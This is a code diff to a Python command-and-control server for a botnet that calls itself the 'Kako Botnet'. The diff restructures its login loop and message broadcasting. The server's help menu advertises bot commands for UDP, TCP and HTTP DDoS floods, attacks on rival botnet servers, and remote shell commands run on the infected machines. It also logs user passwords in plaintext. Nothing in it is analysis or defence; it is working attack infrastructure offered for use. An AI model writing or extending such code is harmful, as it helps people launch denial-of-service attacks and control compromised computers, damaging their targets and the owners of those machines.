@@ -38,7 +38,7 @@ def clientThread(conn):
 	try:
 		global rankGuest
 		global pwordGuest
-		
+
 		createBanned = file("banned.txt", "a")
 		banned = file("banned.txt")
 		with open("banned.txt", "r") as banned:
@@ -69,92 +69,93 @@ def clientThread(conn):
 		    if data:
 		        return conn.recv(512)
 
-		rank = rank(conn)
-		password = password(conn)
-		nickname = nickname(conn)
-		if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
-			conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
-			conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
-			conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
-			conn.sendall("[?] Type >help for a list of commands\r\n")
-			conn.sendall("[?] Your nickname is: %s\n" % nickname)
-			while True:
-				try:
-					message = conn.recv(512)
-					if message:
-						reply = message
-						broadcast(reply, conn)
-					else:
-						remove(conn)
+		while True:
+			rank = rank(conn)
+			password = password(conn)
+			nickname = nickname(conn)
+			if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
+				conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
+				conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
+				conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
+				conn.sendall("[?] Type >help for a list of commands\r\n")
+				conn.sendall("[?] Your nickname is: %s\r\n" % nickname)
+				while True:
+					try:
+						message = conn.recv(512)
+						if message:
+							reply = "[%s] - %s\r\n" % (nickname, message)
+							broadcast(reply, conn)
+						else:
+							remove(conn)
 
-					logs = file("logs.txt", "a")
-					logs.write("%s:%s:%s - %s" % (rank, password, nickname, message))
+						logs = file("logs.txt", "a")
+						logs.write("%s:%s:%s - %s\n" % (rank, password, nickname, message))
 
-					if message.lower().startswith(">help"):
-						conn.sendall("[>] Helpful Info [<]\r\n")
-						conn.sendall("[>] and [<] = Notice\r\n")
-						conn.sendall("[?] = Information\r\n")
-						conn.sendall("[!] = Warning\r\n")
-						conn.sendall("\r\n")
-						conn.sendall("[>] Server Commands [<]\r\n")
-						conn.sendall("[?] >help - Displays a help menu like this\r\n")
-						conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
-						conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
-						conn.sendall("\r\n")
-						conn.sendall("[>] Bot Commands [<]\r\n")
-						conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
-						conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
-						conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
-						conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
-						conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
-						conn.sendall("[?] >killbots - Disconnects all bots\r\n")
-						conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
-						conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
-						if rank.startswith(rankAdmin):
+						if message.lower().startswith(">help"):
+							conn.sendall("[>] Helpful Info [<]\r\n")
+							conn.sendall("[>] and [<] = Notice\r\n")
+							conn.sendall("[?] = Information\r\n")
+							conn.sendall("[!] = Warning\r\n")
 							conn.sendall("\r\n")
-							conn.sendall("[>] Secret Admin Command [<]\r\n")
-							conn.sendall("[?] >password - Changes guest password for this session only\r\n")
+							conn.sendall("[>] Server Commands [<]\r\n")
+							conn.sendall("[?] >help - Displays a help menu like this\r\n")
+							conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
+							conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
+							conn.sendall("\r\n")
+							conn.sendall("[>] Bot Commands [<]\r\n")
+							conn.sendall("[!] Warning! These commands are built into the client made by Law not the server\r\n")
+							conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
+							conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
+							conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
+							conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
+							conn.sendall("[?] >killbots - Disconnects all bots\r\n")
+							conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
+							conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
+							if rank.startswith(rankAdmin):
+								conn.sendall("\r\n")
+								conn.sendall("[>] Secret Admin Command [<]\r\n")
+								conn.sendall("[?] >password - Changes guest password for this session only\r\n")
 
-					if message.lower().startswith(">status"):
-						conn.sendall("[+] Clients Connected: %s\r\n" % clients)
-						conn.sendall("[+] Bots Connected: %s\r\n" % bots)
+						if message.lower().startswith(">status"):
+							conn.sendall("[+] Clients Connected: %s\r\n" % clients)
+							conn.sendall("[+] Bots Connected: %s\r\n" % bots)
 
-					if message.lower().startswith(">credits"):
-						conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
-						conn.sendall("[?] Also coded the client.py file from scratch\r\n")
-						conn.sendall("[?] Picses - Coded the bot connection\r\n")
-						conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
-						conn.sendall("[?] x7041 - Fixed the login over lap\r\n")
+						if message.lower().startswith(">credits"):
+							conn.sendall("[?] Law - Idea and main Programmer(AKA the guy who made this command)\r\n")
+							conn.sendall("[?] Also coded the client.py file from scratch\r\n")
+							conn.sendall("[?] Picses - Coded the bot connection\r\n")
+							conn.sendall("[?] Mac.G - Helped figure out how to broadcast commands using a list\r\n")
+							conn.sendall("[?] x7041 - Fixed the login over lap\r\n")
 
-					if message.lower().startswith(">password"):
-						if rank.startswith(rankAdmin):
-							conn.sendall("[>] This will change the password to guest rank for this session only [<]\r\n")
-							def newPass(conn, prefix="New Password: "):
-								conn.send(prefix)
-								return conn.recv(512)
+						if message.lower().startswith(">password"):
+							if rank.startswith(rankAdmin):
+								conn.sendall("[>] This will change the password to guest rank for this session only [<]\r\n")
+								def newPass(conn, prefix="New Password: "):
+									conn.send(prefix)
+									return conn.recv(512)
 
-							newPass = newPass(conn)
-							pwordGuest = newPass
-							conn.sendall("[?] New Guest Password: %s" % pwordGuest)
+								newPass = newPass(conn)
+								pwordGuest = newPass
+								conn.sendall("[?] New Guest Password: %s" % pwordGuest)
+					except:
+						break
+					if not message:
+						break
+				clientDisconnect()
+				conn.close()
+			else:
+				try:
+					ip = load(urlopen('http://jsonip.com'))['ip']
+					fail = file("fails.txt", "a")
+					fail.write("%s:%s:%s:%s\r\n" % (ip, rank, password, nickname))
+					conn.send("[!] Incorrect Information!\r\n")
+					conn.send("[!] Your IP Address has been logged.\r\n")
+					clientDisconnect()
+					time.sleep(3)
+					conn.close()
 				except:
-					break
-				if not message:
-					break
-			clientDisconnect()
-			conn.close()
-		else:
-			try:
-				ip = load(urlopen('http://jsonip.com'))['ip']
-				fail = file("fails.txt", "a")
-				fail.write("%s:%s:%s:%s" % (ip, rank, password, nickname))
-				conn.send("[!] Incorrect Information!\r\n")
-				conn.send("[!] Your IP Address has been logged.\r\n")
-				clientDisconnect()
-				time.sleep(3)
-				conn.close()
-			except:
-				clientDisconnect()
-				conn.close()
+					clientDisconnect()
+					conn.close()
 	except:
 		pass
 
